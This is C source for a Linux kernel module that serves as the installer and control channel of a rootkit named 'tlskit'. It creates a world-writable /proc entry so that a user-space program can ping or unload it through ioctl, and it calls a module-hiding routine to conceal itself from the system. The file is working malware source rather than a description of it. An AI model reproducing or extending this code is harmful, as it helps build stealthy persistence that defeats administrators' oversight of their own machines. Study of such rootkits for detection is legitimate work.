#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/delay.h>
#include <linux/kthread.h>

#include "module_hiding.h"
#include "shared.h"

static int cleanup(void *_data) {

    /* Wait until ioctl request has returned */
    msleep(500);

    /* Remove the proc entry */
    remove_proc_entry(PROC_ENTRY_NAME, NULL);

    // TODO sleep and free rootkit's memory

    return 0;
}

/*
 * Ioctl communication with the user-space control program
 */
static long ioctl(struct file *file, unsigned int cmd, unsigned long arg) {

    switch (cmd) {

        case RKCTL_PING:

            /*
             * Received a ping, this is used for checking if the rootkit is alive
             */
            break;

        case RKCTL_UNLOAD:

            /*
             * this has to be run async since we cannot remove the proc entry
             * while communicating via it
             */
            kthread_run(cleanup, NULL, "Cleanup_tlskit");
            break;

        default:
            return -ENOTTY;
    }

    return 0;
}

static const struct file_operations proc_file_fops = {
        .owner = THIS_MODULE,
        .unlocked_ioctl = ioctl,
};

static int __init tlskit_init(void) {

    /*
     * Create a file in /proc for ioctl communication
     */

    if (proc_create(PROC_ENTRY_NAME, 0777, NULL, &proc_file_fops) == NULL) {
        return -1;
    }

    if (0 != hide_module()) {
        goto module_hiding_failed;
    }

    return 0;

module_hiding_failed:

    remove_proc_entry(PROC_ENTRY_NAME, NULL);
    return -1;
}

static void __exit tlskit_exit(void) {

    /*
     * Nothing to do here. The kernel module is only used for installing the rootkit. It
     * will be removed immediately after insertion.
     * For removing the rootkit, the user-space control program can be used.
     */

}

module_init(tlskit_init);
module_exit(tlskit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Leon Beckmann");